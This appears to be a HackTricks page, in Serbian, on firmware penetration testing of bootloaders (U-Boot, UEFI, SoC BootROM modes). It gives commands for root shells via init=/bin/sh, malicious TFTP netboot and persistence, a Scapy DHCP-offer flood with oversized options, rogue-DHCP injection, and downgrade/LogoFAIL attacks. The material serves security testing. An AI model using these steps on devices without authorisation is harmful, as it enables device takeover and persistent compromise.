# Testiranje bootloader-a

{{#include ../../banners/hacktricks-training.md}}

Sledeći koraci su preporučeni za izmenu konfiguracija pokretanja uređaja i testiranje bootloader-a kao što su U-Boot i UEFI-klasni loaderi. Fokusirajte se na dobijanje ranog izvršavanja koda, procenu zaštite potpisa/rollback-a i zloupotrebu recovery ili network-boot puteva.

Povezano: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot — brzi rezultati i zloupotreba okruženja

1. Pristup interpreter shell-u
- Tokom boot-a, pritisnite poznat prekidni taster (često bilo koji taster, 0, space, ili board-specific "magic" sekvenca) pre nego što se `bootcmd` izvrši da biste pali na U-Boot prompt.

2. Ispitajte stanje boot-a i promenljive
- Korisne komande:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (podržane metode pokretanja kernela)
- `help ext4load; help fatload; help tftpboot` (dostupni loader-i)

3. Izmenite boot argumente da dobijete root shell
- Dodajte `init=/bin/sh` tako da kernel padne u shell umesto normalnog init-a:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot sa vašeg TFTP servera
- Konfigurišite mrežu i preuzmite kernel/fit image sa LAN-a:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persistiranje izmena preko environment-a
- Ako skladište env-a nije write-protected, možete zabeležiti kontrolu:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Proverite varijable kao što su `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` koje utiču na fallback puteve. Pogrešno konfigurisanih vrednosti može omogućiti ponovljene prekide u shell.

6. Proverite debug/unsafe funkcije
- Potražite: `bootdelay` > 0, `autoboot` onemogućen, neograničen `usb start; fatload usb 0:1 ...`, mogućnost `loady`/`loads` preko serije, `env import` sa nepouzdanih medija, i kerneli/ramdiski koji se učitavaju bez provere potpisa.

7. U-Boot image/verification testiranje
- Ako platforma tvrdi secure/verified boot sa FIT image-ima, probajte i unsigned i tampered image-e:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Odsustvo `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ili legacy `verify=n` ponašanja često dozvoljava boot-ovanje proizvoljnih payload-a.

## Network-boot površina (DHCP/PXE) i rogue serveri

8. PXE/DHCP parametar fuzzing
- Legacy BOOTP/DHCP obrada u U-Bootu je imala memory-safety probleme. Na primer, CVE‑2024‑42040 opisuje memory disclosure via crafted DHCP responses koji mogu leak bytes iz U-Boot memorije nazad na mrežu. Testirajte DHCP/PXE kod puteve sa predugačkim/edge-case vrednostima (option 67 bootfile-name, vendor options, file/servername fields) i posmatrajte za zamrzavanja/leaks.
- Minimalan Scapy snippet za stresiranje boot parametara tokom netboot-a:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Takođe proverite da li su PXE filename polja prosleđena shell/loader logici bez sanitizacije kada se dalje povezuju na OS-side provisioning skripte.

9. Rogue DHCP server command injection testiranje
- Postavite rogue DHCP/PXE servis i pokušajte ubaciti karaktere u filename ili option polja kako biste dohvatili command interpretere u kasnijim fazama boot lanca. Metasploit-ov DHCP auxiliary, `dnsmasq`, ili custom Scapy skripte dobro rade. Obavezno izolujte lab mrežu prvo.

## SoC ROM recovery modovi koji nadjačavaju normalan boot

Mnogi SoC-ovi izlažu BootROM "loader" mod koji prihvata kod preko USB/UART čak i kada flash image-i nisu validni. Ako secure-boot fuse-ovi nisu spaljeni, ovo može obezbediti proizvoljno izvršenje koda veoma rano u lancu.

- NXP i.MX (Serial Download Mode)
- Alati: `uuu` (mfgtools3) ili `imx-usb-loader`.
- Primer: `imx-usb-loader u-boot.imx` za push i run custom U-Boot iz RAM-a.
- Allwinner (FEL)
- Alat: `sunxi-fel`.
- Primer: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ili `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Alat: `rkdeveloptool`.
- Primer: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` za stage loader i upload custom U-Boot.

Procijenite da li uređaj ima secure-boot eFuses/OTP spaljene. Ako nisu, BootROM download modovi često zaobilaze bilo kakvu višu verifikaciju (U-Boot, kernel, rootfs) izvršavajući vaš first-stage payload direktno iz SRAM/DRAM.

## UEFI/PC-class bootloader-i: brze provere

10. ESP tampering i rollback testiranje
- Montirajte EFI System Partition (ESP) i proverite loader komponente: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo putanje.
- Pokušajte boot-ovanje sa downgraded ili poznato vulnerabilnim signed boot komponentama ako Secure Boot revocations (dbx) nisu ažurirane. Ako platforma i dalje veruje starim shim-ovima/bootmanager-ima, često možete učitati sopstveni kernel ili `grub.cfg` sa ESP-a da dobijete persistenciju.

11. Bugovi u parsiranju boot logo-a (LogoFAIL klasa)
- Nekoliko OEM/IBV firmvera je bilo ranjivo na image-parsing propuste u DXE koji procesuiraju boot logoe. Ako napadač može postaviti crafted image na ESP pod vendor-specific putanjom (npr. `\EFI\<vendor>\logo\*.bmp`) i restartovati, izvršavanje koda tokom ranog boot-a može biti moguće čak i sa Secure Boot-om omogućenim. Testirajte da li platforma prihvata korisnički dodate logo-e i da li su te putanje writable iz OS-a.

## Hardverske mere opreza

Budite oprezni prilikom rada sa SPI/NAND flash-om tokom ranog boot-a (npr. uzemljivanje pinova da biste zaobišli čitanja) i uvek konsultujte flash datasheet. Pogrešno tempirani short-ovi mogu korumpirati uređaj ili programmer.

## Beleške i dodatni saveti

- Probajte `env export -t ${loadaddr}` i `env import -t ${loadaddr}` za pomeranje environment blob-ova između RAM-a i skladišta; neke platforme dopuštaju import env-a sa uklonjivih medija bez autentifikacije.
- Za persistenciju na Linux-based sistemima koji boot-uju preko `extlinux.conf`, izmena `APPEND` linije (da ubacite `init=/bin/sh` ili `rd.break`) na boot particiji je često dovoljna kada nema provere potpisa.
- Ako userland obezbeđuje `fw_printenv/fw_setenv`, proverite da li `/etc/fw_env.config` odgovara stvarnom env skladištu. Pogrešno konfigurisani offset-i vam omogućavaju da čitate/pišete pogrešan MTD region.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
